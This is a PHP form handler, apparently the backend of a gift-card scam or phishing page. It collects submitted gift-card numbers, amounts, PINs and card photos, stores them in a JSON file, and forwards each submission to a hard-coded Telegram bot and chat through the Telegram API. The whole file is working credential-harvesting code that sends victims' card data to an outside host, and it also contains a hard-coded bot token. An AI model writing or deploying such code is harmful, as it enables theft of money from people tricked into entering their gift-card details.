<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cardNumber = $_POST["card_number"];
    $amount = $_POST["amount"];
    $pin = $_POST["pin"] ?? "N/A";
    $giftCard = $_POST["gift_cards"] ?? "Not Selected";
    $status = "Pending";
    $imagePath = "";

    // ✅ Handle File Upload
    if (!empty($_FILES["card_image"]["name"])) {
        $uploadDir = "uploads/";
        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0777, true);
        }

        $imageFileType = strtolower(pathinfo($_FILES["card_image"]["name"], PATHINFO_EXTENSION));
        $allowedTypes = ["jpg", "jpeg", "png"];

        if (in_array($imageFileType, $allowedTypes)) {
            $imagePath = $uploadDir . uniqid() . "." . $imageFileType;
            move_uploaded_file($_FILES["card_image"]["tmp_name"], $imagePath);
        } else {
            echo "Invalid image format.";
            exit;
        }
    }

    // ✅ Save Data to JSON
    $newData = [
        "gift_cards" => $giftCard,
        "card_number" => $cardNumber,
        "amount" => $amount,
        "pin" => $pin,
        "status" => $status,
        "image" => $imagePath
    ];

    $file = "data.json";

    if (file_exists($file)) {
        $jsonData = json_decode(file_get_contents($file), true);
    } else {
        $jsonData = [];
    }

    $jsonData[] = $newData;
    file_put_contents($file, json_encode($jsonData, JSON_PRETTY_PRINT));

    // ✅ Telegram API Credentials
    $botToken = "8135029951:AAGw-kDu3NVzOldOjttvvYJSKxv4IFg8q48";  
    $chatId = "7557838902";  

    // ✅ Prepare Message
    $message = "📌 *New Submission Received!*\n\n"
        . "💳 Gift Card: *$giftCard*\n"
        . "🔢 Card Number: *$cardNumber*\n"
        . "💰 Amount: *$amount*\n"
        . "🔑 PIN: *$pin*\n"
        . "📌 Status: *$status*";

    // ✅ Send Text to Telegram
    $textUrl = "https://api.telegram.org/bot$botToken/sendMessage";
    $textData = ["chat_id" => $chatId, "text" => $message, "parse_mode" => "Markdown"];
    
    $textOptions = [
        "http" => [
            "header" => "Content-Type: application/json",
            "method" => "POST",
            "content" => json_encode($textData),
        ]
    ];
    file_get_contents($textUrl, false, stream_context_create($textOptions));

    // ✅ Send Image to Telegram (if uploaded)
    if (!empty($imagePath)) {
        $imageUrl = "https://api.telegram.org/bot$botToken/sendPhoto";
        $postData = ["chat_id" => $chatId, "photo" => new CURLFile($imagePath)];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $imageUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }

    echo "✅ Submission Successful! Data sent to Telegram.";
}
$selectedType = $_POST['gift_card'] ?? '';

?>
